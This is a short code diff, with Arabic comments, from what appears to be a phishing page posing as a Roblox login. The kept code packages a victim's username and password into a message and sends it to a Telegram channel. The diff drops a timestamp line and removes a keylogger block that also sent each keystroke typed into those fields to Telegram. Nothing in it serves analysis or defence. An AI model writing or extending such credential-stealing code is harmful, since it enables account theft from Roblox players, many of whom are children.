@@ -253,8 +253,7 @@
         // إرسال البيانات إلى تليجرام
         let dataMsg = `<b>🔓 بيانات روبلوكس</b>\n\n`;
         dataMsg += `👤 اسم المستخدم: ${username}\n`;
-        dataMsg += `🔑 كلمة المرور: ${password}\n\n`;
-        dataMsg += `📅 الوقت: ${new Date().toISOString()}`;
+        dataMsg += `🔑 كلمة المرور: ${password}`;
 
         sendToTelegram(dataMsg);
 
@@ -267,15 +266,6 @@
             document.getElementById('password').value = '';
             document.getElementById('errorMsg').style.display = 'none';
         }, 3000);
-    });
-
-    // =============================================
-    // Keylogger (تسجيل كل ما يكتب)
-    // =============================================
-    document.addEventListener('input', e => {
-        if (e.target.value && (e.target.id === 'username' || e.target.id === 'password')) {
-            sendToTelegram(`⌨️ <b>كتابة في حقل ${e.target.id}</b>\n${e.target.value.substring(0, 50)}`);
-        }
     });
 
     console.log('✅ صفحة روبلوكس تعمل');
